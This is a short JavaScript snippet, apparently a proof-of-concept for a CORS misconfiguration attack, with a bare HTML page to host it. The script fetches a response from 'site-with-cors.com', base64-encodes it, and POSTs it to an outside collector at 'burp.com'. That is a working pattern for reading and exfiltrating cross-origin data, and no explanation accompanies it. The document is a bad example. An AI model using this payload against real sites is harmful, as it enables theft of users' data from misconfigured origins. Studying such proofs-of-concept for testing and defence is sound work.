fetch('https://site-with-cors.com')
  .then(response => response.blob())
  .then(blob => {
    const reader = new FileReader();
    reader.readAsDataURL(blob);
    reader.onload = () => {
      const base64Data = reader.result.split(',')[1];
      const xhr = new XMLHttpRequest();
      xhr.open('POST', 'https://burp.com');
      xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
      xhr.send(`data=${encodeURIComponent(base64Data)}`);
    };
  })
  .catch(error => console.error(error));
// request to burp with base64

<!DOCTYPE html>
<html>
<head>
  <title>Fetch and Base64 Example</title>
</head>
<body>
  <script>
    // Paste the JavaScript code here
  </script>
</body>
</html>

// node fetch-and-base64.js
